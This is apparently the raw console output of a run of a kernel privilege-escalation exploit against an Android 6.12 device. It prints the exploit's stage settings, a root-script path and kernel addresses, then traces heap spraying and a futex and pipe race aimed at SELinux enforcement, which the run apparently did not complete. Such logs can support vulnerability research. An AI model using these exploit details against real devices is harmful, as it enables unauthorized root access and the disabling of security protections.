[33m[*] [0mkernel: 6.12.58-android16-6-gff10eaa8f8a4-ab15575650-4k
[32m[+] [0mresolved profile loaded: 6.12.58-android16-6-gff10eaa8f8a4-ab15575650-4k
[33m[*] [0mcpu pair: main=0 consumer=1
[33m[*] [0mruntime home=/data/local/tmp script=/data/local/tmp/.ghostlock_root.sh
[33m[*] [0mdebug.execution.begin release=6.12.58-android16-6-gff10eaa8f8a4-ab15575650-4k
[33m[*] [0mdebug.execution.recommended_cpus.main=0
[33m[*] [0mdebug.execution.recommended_cpus.consumer=1
[33m[*] [0mdebug.execution.selected_cpus.main=0
[33m[*] [0mdebug.execution.selected_cpus.consumer=1
[33m[*] [0mdebug.execution.heap.prepare_max_attempts=4
[33m[*] [0mdebug.execution.heap.prepare_timeout_ms=240000
[33m[*] [0mdebug.execution.heap.kernelsnitch_timeout_ms=60000
[33m[*] [0mdebug.execution.race.route_wait_ms=1000
[33m[*] [0mdebug.execution.race.setup_settle_us=50000
[33m[*] [0mdebug.execution.race.state_poll_interval_us=1000
[33m[*] [0mdebug.execution.stages.w1_attempts=15
[33m[*] [0mdebug.execution.stages.w1_settle_us=100000
[33m[*] [0mdebug.execution.stages.w1_scratch_repair_attempts=3
[33m[*] [0mdebug.execution.stages.w2_attempts=15
[33m[*] [0mdebug.execution.stages.w2_settle_us=100000
[33m[*] [0mdebug.execution.stages.w3_chain_rounds=3
[33m[*] [0mdebug.execution.stages.w3_attempts=6
[33m[*] [0mdebug.execution.stages.w3_settle_us=50000
[33m[*] [0mdebug.execution.routes.tcp_zerocopy.attempts=0
[33m[*] [0mdebug.execution.routes.tcp_zerocopy.arm_sequence=0
[33m[*] [0mdebug.execution.routes.tcp_zerocopy.post_receive_hold_iterations=0
[33m[*] [0mdebug.execution.routes.select_stack.enter_delay_us=0
[33m[*] [0mdebug.execution.routes.select_stack.timeout_us=0
[33m[*] [0mdebug.execution.routes.select_stack.consumer_max_calls=1
[33m[*] [0mdebug.execution.routes.select_stack.consumer_burst_calls=1
[33m[*] [0mdebug.execution.handoff.pre_dispatch_settle_ms=2000
[33m[*] [0mdebug.execution.handoff.module_poll_attempts=30
[33m[*] [0mdebug.execution.handoff.module_poll_interval_ms=100
[33m[*] [0mdebug.execution.handoff.enforce_poll_attempts=200
[33m[*] [0mdebug.execution.handoff.enforce_poll_interval_ms=100
[33m[*] [0mdebug.execution.end
[33m[*] [0msoc: mtk; kernel_phys_load=0x80000000
[33m[*] [0minit_cred image=ffffffc082553830 alias=ffffff8002553830
[33m[*] [0mroot script written path=/data/local/tmp/.ghostlock_root.sh bytes=6081
[33m[*] [0miomem cache: no usable dump, keeping the built-in geometry
[32m[+] [0mstartup context pid=6201 uid=2000 euid=2000 gid=2000 egid=2000 boot_ms=41327 attr=u:r:shell:s0 enforce=1
[32m[+] [0mstartup limits pid=6201 NoNewPrivs=0 Seccomp=0 Seccomp_filters=0
[32m[+] [0mbuild config pid=6201 label=ghostlock_oplus slide=pselect main=pselect
[32m[+] [0mp0 profile pid=6201 phys_offset=0000000080000000 kernel_phys_load=0000000080000000 delta=0000000000000000 slide_logger=ffffff80025321b0 bootid_data=ffffff80027e8d48 init_task=ffffff800253dac0 root_tg=ffffff80027778c0 sysctl_bootid=ffffff80027e8d48
[33m[*] [0mp0 kernel_phys_load=0000000080000000 delta=0000000000000000
[33m[*] [0mmain thread running on cpu=0
[33m[*] [0m[T+0ms] exploit start
[33m[*] [0m[T+0ms] pre-W1 drain
[33m[*] [0mW1: SELinux attempt 1/15
[33m[*] [0m=== W1: SELinux === target=0xffffff80027c6960 mode=1 leaf=0
[33m[*] [0m[T+43ms]   heap spray start
[33m[*] [0m[spray] mm spray + kernelsnitch ready (cpu=8) +140ms
[33m[*] [0m[spray] finding futex collisions... +295ms
[33m[*] [0m[spray] early collision screen 5/3 at 37%
[33m[*] [0m[spray] futex collisions found +800ms
[33m[*] [0m[spray] mm_struct leaked=0xffffff831bcf9e00 +813ms
[33m[*] [0m[spray] payload ready +813ms
[33m[*] [0mprepare_kernel_page ok attempt=1 +875ms
[33m[*] [0m[T+919ms]   heap spray done
[33m[*] [0m[route] creating waiter/owner/consumer
[33m[*] [0mconsumer thread running on cpu=1
[33m[*] [0m[route] waiter parked; owner started
[33m[*] [0m[route] CMP_REQUEUE_PI ret=-1 errno=35; waiting route_done
[33m[*] [0mfd_graph route geometry: eventpoll_size=208 epitem_ep=72 epitem_fllink=80 pipe_buffer=40 pipe_flags=24 pipe_slots=32 pipe_ring=1280 pipe_object=2048 graph_width=96 graph_fanout=256 graph_edges=24576 objects_per_order3=16
[33m[*] [0mfd_graph: reclaim_small complete fds=240
[33m[*] [0mfd_graph: drain_small complete fds=240
[33m[*] [0m[spray] early collision screen 5/1 at 50%
[33m[*] [0mfd_graph: collisions=2 page=ffffff831bcf8000
[33m[*] [0mfd_graph: drain_expand complete fds=240
[33m[*] [0mfd_graph: reclaim_expand complete fds=240
[33m[*] [0mfd_graph: step=0 delay_us=0 pipe_fill=8
[33m[*] [0mfd_graph: step=1 delay_us=1 pipe_fill=8
[33m[*] [0mfd_graph: step=2 delay_us=2 pipe_fill=8
[33m[*] [0mfd_graph: step=3 delay_us=4 pipe_fill=8
[33m[*] [0mfd_graph: step=4 delay_us=8 pipe_fill=8
[33m[*] [0mfd_graph: step=5 delay_us=12 pipe_fill=8
[33m[*] [0mfd_graph: step=6 delay_us=20 pipe_fill=8
[33m[*] [0mfd_graph: step=7 delay_us=32 pipe_fill=8
[33m[*] [0mfd_graph: step=8 delay_us=48 pipe_fill=8
[33m[*] [0mfd_graph: step=9 delay_us=64 pipe_fill=8
[33m[*] [0mfd_graph: RACE_SUMMARY tries=10 pipe_fill_hits=10 chain_hits=0 bit4_hits=0 delivery=not-implemented target=ffffff80027c6960
